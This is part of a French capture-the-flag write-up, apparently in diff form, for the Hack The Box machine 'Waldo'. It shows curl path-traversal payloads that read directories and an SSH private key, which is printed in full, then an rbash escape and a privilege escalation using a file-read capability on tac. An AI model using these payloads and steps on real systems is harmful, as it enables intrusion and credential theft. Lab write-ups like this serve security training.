@@ -116,3 +116,118 @@ Parfait nous avons réussis à lire le fichier passwd.
 
     root@:~/# cat passwd_list|awk -F: '{print $1, $6}' passwd_list|grep '/home'
     nobody /home/nobody
+
+L'utilisateur se nomme nobody donc comme nous avons trouver le moyen de bypass les accès dossiers reste plus que à lire les dossiers avec le fichier dirRead.php.
+
+    root@:~/# curl -s -X POST http://10.10.10.87/dirRead.php -d "path=....//....//....//home"|jq
+    [
+      ".",
+      "..",
+      "nobody"
+    ]
+    
+    root@:~/# curl -s -X POST http://10.10.10.87/dirRead.php -d "path=....//....//....//home/nobody"|jq
+    [
+      ".",
+      "..",
+      ".ash_history",
+      ".ssh",
+      ".viminfo",
+      "user.txt"
+    ]
+    root@:~/# curl -s -X POST http://10.10.10.87/dirRead.php -d "path=....//....//....//home/nobody/.ssh"|jq
+    [
+      ".",
+      "..",
+      ".monitor",
+      "authorized_keys",
+      "known_hosts"
+    ]
+Il y'a un fichier qui se nomme .monitor ça ressemble à une clé RSA je vais réutillisé le fichier fileRead.php pour lire se fichier.
+
+    root@:~/# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=....//....//....//home/nobody/.ssh/.monitor"|jq -r .file > waldo.key
+    -----BEGIN RSA PRIVATE KEY-----
+    MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
+    mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
+    87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
+    dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
+    o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
+    vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
+    vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
+    pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
+    8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
+    1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
+    VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
+    dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
+    v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
+    xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
+    qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
+    yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
+    /pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
+    LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
+    lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
+    w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
+    1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
+    rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
+    X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
+    DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
+    W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=
+    -----END RSA PRIVATE KEY-----
+    
+Parfait nous avons une clé maintenant nous avons tout ce qui faut pour nous connecter au serveur SSH.
+
+    root@:~/# chmod 600 waldo.key
+    root@:~/# ssh -i waldo.key nobody@10.10.10.87
+    Welcome to Alpine!
+
+    The Alpine Wiki contains a large amount of how-to guides and general
+    information about administrating Alpine systems.
+    See <http://wiki.alpinelinux.org>.
+    waldo:~$ 
+
+Parfait nous sommes connecté au serveur SSH.
+
+    waldo:~$ ls
+    user.txt
+    waldo:~$ wc -c user.txt 
+    33 user.txt
+    waldo:~$
+
+PrivEsc
+----
+Le PrivEsc n'est pas très compliqué regardons le fichier authorized_keys.
+
+    waldo:~/.ssh$ cat authorized_keys 
+    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvfmonitor@waldo
+    waldo:~/.ssh$
+
+Nous avons un utillisateur on va essayer de se reconnecter avec la même clé SSH à l'utilisatuer monitor.
+
+    waldo:~/.ssh$ ssh -i .monitor monitor@localhost
+    Last login: Tue Jan  8 14:01:44 2019 from 127.0.0.1
+    -rbash: alias: command not found
+    monitor@waldo:~$ cd /
+    -rbash: cd: restricted
+    monitor@waldo:~$ cd /var/
+    -rbash: cd: restricted
+    monitor@waldo:~$
+
+La connexion s'effectue avec succès, le seul problème c'est que on a accès à un aucun dossier.. regardons les variables d'environnements ($PATH). Les fichiers binaires ne sont pas exporter.
+
+    waldo:~/.ssh$ ssh -i .monitor monitor@localhost -t bash --noprofile
+
+Parfait nous avons accès à les commandes. Maintenant si on tape la commande getcap -r / 2>/dev/null nous allons voir des fichiers qui ont été set.
+
+    monitor@waldo:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
+    monitor@waldo:~$ getcap -r / 2>/dev/null
+    /usr/bin/tac = cap_dac_read_search+ei
+    /home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
+    
+Reste plus que à lire le fichier root.txt avec la commande tac.
+
+    monitor@waldo:~$ tac /root/root.txt
+    8fb67c84418be6e[SO....]
+
+
+
+
